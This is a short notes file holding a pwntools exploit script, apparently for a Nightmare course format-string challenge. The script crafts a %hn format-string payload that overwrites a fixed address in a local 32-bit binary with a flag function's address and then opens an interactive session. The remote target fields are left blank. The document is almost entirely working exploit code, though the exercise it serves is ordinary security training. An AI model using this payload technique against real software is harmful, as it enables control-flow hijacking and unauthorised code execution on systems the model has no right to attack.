# bbpwn
-> Nightmare module 10 fmt strings

Steps
  1.
  2.
  

## Script

``` python
#!/usr/bin/env python3
import subprocess
from pwn import *

binary_path = './32_new'
libc_path = ''
remote_host = ''
remote_port = 0  # <-- Needs to be a valid integer if using REMOTE

context.binary = binary_path
#context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary
#libc = ELF(libc_path)
rop = ROP(elf)
if args.GDB:
    p = gdb.debug(binary_path, gdbscript='b *main+196')
elif args.REMOTE:
    p = remote(remote_host, remote_port)
else:
    p = process(binary_path)



def main():

    what = 0x0804870b #flag
    where =  0x804a028
    #print(hex(one))
    last = 2052
    third = 34571

    payload = b''

    payload += b'%1982c'
    payload += b'%17$hn'
    payload += b'%32519c'
    payload += b'%18$hn'
    payload += b'A' * 3
    payload += p32(where + 2)
    payload += p32(where)




    p.sendline(payload)

    p.interactive()

if __name__ == '__main__':
    main()
```
